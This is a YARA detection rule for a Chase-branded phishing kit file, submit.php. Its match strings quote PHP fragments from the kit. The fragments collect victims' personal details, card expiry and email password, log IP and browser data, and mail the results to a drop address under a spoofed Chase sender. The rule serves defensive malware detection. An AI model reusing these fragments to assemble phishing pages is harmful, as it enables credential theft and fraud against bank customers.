rule infected_08_27_18_chase2_chase2018_Verification_login_phishing_submit {
  meta:
    description = "phishing - file submit.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2018-08-27"
    hash1       = "44e314c57c85e8154f6144e3fa68be6b79fac524eba7cebf62bde4a2bda00312"

  strings:
    $x1  = "$VictimInfo .= \"| IP Address : \" . $_SERVER['REMOTE_ADDR'] . \" (\" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . \")\\r\\n\";" fullword ascii
    $s2  = "$headers = \"From:Chase<customer-support@schoolofhacking.com>\";" fullword ascii
    $s3  = "$VictimInfo .= \"| UserAgent : \" . $systemInfo['useragent'] . \"\\r\\n\";" fullword ascii
    $s4  = "$message .= \"------+ H3lpL1n3 Inc Customer Service (*^*)#911 +------\\n\";" fullword ascii
    $s5  = "header(\"Location:success.php?sslchannel=true&sessionid=\" . generateRandomString(80))" fullword ascii
    $s6  = "$VictimInfo .= \"| Browser : \" . $systemInfo['browser'] . \"\\r\\n\";" fullword ascii
    $s7  = "$VictimInfo .= \"| Platform : \" . $systemInfo['os'] . \"\";" fullword ascii
    $s8  = "$send = \"mr.magma2017@gmail.com\";" fullword ascii
    $s9  = "$message .= \"--------------+ Chase FullZ +-----------------------\\n\";" fullword ascii
    $s10 = "$message .= \"-------------+ Vict!m Info +----------------------\\n\";" fullword ascii
    $s11 = "$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);" fullword ascii
    $s12 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
    $s13 = "require \"includes/session_protect.php\";" fullword ascii
    $s14 = "$message .= \"Address            : \".$_POST['Address'].\"\\n\";" fullword ascii
    $s15 = "$message .= \"DOB            : \".$_POST['day'].'-'.$_POST['month'].'-'.$_POST['year'].\"\\n\";" fullword ascii
    $s16 = "$message .= \"Expire date            : \".$_POST['expmonth'].'-'.$_POST['expyear'].\"\\n\";" fullword ascii
    $s17 = "$message .= \"Pass            : \".$_POST['emailpass'].\"\\n\";" fullword ascii
    $s18 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
    $s19 = "$message .= \"\".$VictimInfo.\"\\n\";" fullword ascii
    $s20 = "mail($send,$subject,$message,$headers);" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 6KB and
      (1 of ($x*) and 4 of them)
    ) or (all of them)
}